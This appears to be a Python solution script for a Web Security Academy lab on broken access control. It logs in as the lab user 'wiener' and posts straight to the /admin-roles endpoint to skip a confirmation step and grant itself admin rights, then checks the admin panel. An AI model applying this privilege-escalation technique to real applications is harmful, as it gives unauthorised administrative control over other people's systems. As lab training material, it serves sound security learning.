import requests

site = '0a7300450344f23a80d05d8900970073.web-security-academy.net'
s = requests.Session()

# Step 1: Log in as wiener
login_url = f'https://{site}/login'
s.post(login_url, data={'username': 'wiener', 'password': 'peter'})

# Step 2: Try to upgrade yourself
adminrole_url = f'https://{site}/admin-roles'
upgrade_data = {
    'username': 'wiener',
    'action': 'upgrade',
    'confirmed': 'true'
}

resp = s.post(adminrole_url, data=upgrade_data)

# Step 3: Check if it worked
print(resp.status_code)
print(resp.text)

# Step 4: Visit /admin to verify
resp = s.get(f'https://{site}/admin')
print(resp.status_code)
print("Accessed admin panel!" if "Admin panel" in resp.text else "Upgrade might have failed.")
